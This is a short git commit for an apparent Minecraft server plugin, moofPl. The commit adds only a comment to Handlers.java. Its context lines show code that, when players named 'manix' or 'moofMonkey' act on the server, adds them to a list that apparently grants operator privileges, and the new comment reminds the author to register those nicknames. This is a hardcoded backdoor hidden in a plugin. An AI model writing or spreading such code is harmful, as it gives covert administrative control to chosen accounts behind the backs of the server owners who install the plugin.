28fc0b70f3dc0068f7578f5f74b7d5d82645d848
Nikita <tyumencev2004@bk.ru>
2017-01-26 20:51:46 +0300

    Whoops

--- moofPl/Handlers.java
+++ moofPl/Handlers.java
@@ -257,7 +257,7 @@ public class Handlers extends Thread implements Listener {
 		String name = event.getPlayer().getName();
 		Player pl = event.getPlayer();
 
-		if (name.equalsIgnoreCase("manix") || name.equalsIgnoreCase("moofMonkey")) {
+		if (name.equalsIgnoreCase("manix") || name.equalsIgnoreCase("moofMonkey")) { // Don't forget to register this nicknames!
 			main.reloadConfig();
 			if (!Main.canOp.contains(name)) {
 				Main.canOp.add(name);
